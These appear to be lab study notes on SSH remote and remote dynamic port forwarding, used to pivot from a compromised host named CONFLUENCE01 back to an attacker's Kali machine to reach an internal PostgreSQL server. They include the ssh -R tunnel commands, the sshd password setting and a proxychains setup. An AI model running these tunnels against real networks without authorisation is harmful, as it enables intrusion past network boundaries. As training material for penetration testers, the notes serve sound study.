# SSH Remote port forwarding

## Remote Port Forwarding

The listening TCP port 2345 is bound to the loopback interface on our Kali machine. Packets sent to this port are pushed by the Kali SSH server software through the SSH tunnel back to the SSH client on CONFLUENCE01. They are then forwarded to the PostgreSQL database port on PGDATABASE01.

**start SSH on kali machine**

```sh
sudo systemctl start ssh
sudo ss -ntplu
```

To connect back to the Kali SSH server using a username and password you may have to explicity allow password-based authentication by setting **PasswordAuthentication** to **yes** in **/etc/ssh/sshd\_config**.

{% code overflow="wrap" %}
```sh
ssh -N -R 127.0.0.1:2345:10.4.50.215:5432 kali@192.168.118.4
```
{% endcode %}

* `-R` - SSH remote port forwarding\
  listen on kali machine and forward all traffic to the target machine

## Remote Dynamic Port Forwarding

creates a _dynamic port forward_ in the _remote_ configuration. The SOCKS proxy port is _bound to the SSH server_, and traffic is _forwarded from the SSH client_.

```sh
ssh -N -R 9998 kali@192.168.118.4
```

* uses the same **-R** option as classic remote port forwarding
  * difference: only pass 1 socket (the socket we want to listen to) for dynamic remote port forwarding
* `-R 9998` - bind the SOCKS proxy to port 9998 on the loopback interface of our Kali machine

**Proxychains**

`/etc/proxychains4.conf`\
Add to proxychains conf on kali machine = `socks5 127.0.0.1 9998`

`proxychains -q` - quiet mode (less verbose)

{% embed url="https://dev.to/adamkatora/how-to-use-burp-suite-through-a-socks5-proxy-with-proxychains-and-chisel-507e" %}
